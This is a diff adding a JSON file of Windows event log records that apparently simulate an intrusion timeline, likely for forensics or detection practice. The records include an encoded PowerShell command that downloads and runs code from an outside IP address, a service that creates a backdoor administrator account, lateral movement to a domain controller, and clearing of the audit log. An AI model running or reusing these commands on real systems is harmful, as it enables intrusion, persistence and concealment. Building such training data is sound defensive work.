@@ -1,0 +1,62 @@
+[
+  {
+    "file": "Security.evtx",
+    "line_number": 1,
+    "timestamp": "2026-06-01T02:15:30Z",
+    "event_id": 4624,
+    "source": "Microsoft-Windows-Security-Auditing",
+    "computer": "DESKTOP-HR01",
+    "username": "jcarter",
+    "details": "An account was successfully logged on. Logon Type: 3 (Network). Source Network Address: 192.168.1.105. Port: 5985 (WinRM). Logon Process: NtLmSsp."
+  },
+  {
+    "file": "System.evtx",
+    "line_number": 12,
+    "timestamp": "2026-06-01T02:22:15Z",
+    "event_id": 7045,
+    "source": "Service Control Manager",
+    "computer": "DESKTOP-HR01",
+    "username": "SYSTEM",
+    "details": "A service was installed in the system. Service Name: UpdaterService. Service File Name: C:\\Windows\\Temp\\updater.exe. Service Type: user mode service. Service Start Type: demand start."
+  },
+  {
+    "file": "Security.evtx",
+    "line_number": 45,
+    "timestamp": "2026-06-01T02:30:00Z",
+    "event_id": 4688,
+    "source": "Microsoft-Windows-Security-Auditing",
+    "computer": "DESKTOP-HR01",
+    "username": "SYSTEM",
+    "details": "A new process has been created. Creator Subject User: SYSTEM. Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe. CommandLine: powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8ANAA1AC4AMgAyADcALgAyADUANAAuADEAMgAvAGEAcwBzAGUAdABzACcAKQA=. Parent Process: C:\\Windows\\Temp\\updater.exe."
+  },
+  {
+    "file": "Security.evtx",
+    "line_number": 89,
+    "timestamp": "2026-06-01T03:05:12Z",
+    "event_id": 4624,
+    "source": "Microsoft-Windows-Security-Auditing",
+    "computer": "AD-CONTROLLER",
+    "username": "Administrator",
+    "details": "An account was successfully logged on. Logon Type: 3 (Network). Source Network Address: 192.168.1.105 (DESKTOP-HR01). Logon Process: Kerberos. Key Length: 0."
+  },
+  {
+    "file": "System.evtx",
+    "line_number": 95,
+    "timestamp": "2026-06-01T03:10:45Z",
+    "event_id": 7045,
+    "source": "Service Control Manager",
+    "computer": "AD-CONTROLLER",
+    "username": "SYSTEM",
+    "details": "A service was installed in the system. Service Name: MaliciousAdminService. Service File Name: C:\\Windows\\System32\\cmd.exe /c net user /add attacker backdoor123 & net localgroup administrators attacker /add. Service Type: user mode service. Service Start Type: demand start."
+  },
+  {
+    "file": "Security.evtx",
+    "line_number": 150,
+    "timestamp": "2026-06-01T04:00:00Z",
+    "event_id": 1102,
+    "source": "Microsoft-Windows-Eventlog",
+    "computer": "DESKTOP-HR01",
+    "username": "jcarter",
+    "details": "The audit log was cleared. Subject User Name: jcarter. Subject Domain Name: WORKGROUP. Subject Logon ID: 0x3E7."
+  }
+]
